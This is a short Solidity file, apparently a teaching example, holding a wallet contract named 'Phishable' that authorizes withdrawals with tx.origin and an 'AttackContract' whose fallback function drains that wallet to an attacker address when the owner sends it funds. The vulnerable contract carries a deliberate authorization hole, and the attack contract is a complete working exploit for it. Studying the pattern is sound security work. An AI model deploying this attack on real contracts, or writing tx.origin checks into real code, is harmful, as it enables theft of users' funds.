contract Phishable {
    address public owner;
    // initalised with the address of the owner so we can verify withdraws
    constructor (address _owner) {
        owner = _owner; 
    }
    // allow easy deposit of funds
    function deposit() public payable {}
    // withdraw funds and verify owner
    function withdrawAll(address payable _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(address(this).balance); 
    }
}

contract AttackContract { 
    
    Phishable phishableContract; 
    address payable attacker; // The attackers address to receive funds.
    constructor (Phishable _phishableContract, address payable _attackerAddress) { 
        phishableContract = _phishableContract; 
        attacker = _attackerAddress;
    }
    // fallback function allows us to continue transaction to the target contract
    fallback() external payable{ 
        phishableContract.withdrawAll(attacker); 
    }
}